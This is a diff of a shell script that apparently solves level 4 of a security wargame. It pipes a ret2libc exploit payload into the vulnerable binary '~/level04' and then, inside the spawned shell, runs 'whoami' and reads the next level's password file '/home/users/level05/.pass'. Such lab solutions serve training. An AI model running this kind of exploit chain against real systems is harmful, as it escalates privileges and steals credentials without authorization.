@@ -27,10 +27,7 @@ EOI
 
 # set -x
 buildExploitRet2Libc
-# echo "whoami" >> /tmp/exploit04
-# echo "cat /home/users/level05/.pass" >> /tmp/exploit04
-cat /tmp/exploit04 - | ~/level04
-# (cat /tmp/exploit04 - | ~/level04) << EOI
-    # echo "\nwhoami: \$(whoami)"
-    # echo "Next pass is:  \$(cat /home/users/level05/.pass)\n"
-# EOI
+(cat /tmp/exploit04 - | ~/level04) << EOI
+    echo "\nwhoami: \$(whoami)"
+    echo "Next pass is:  \$(cat /home/users/level05/.pass)\n"
+EOI
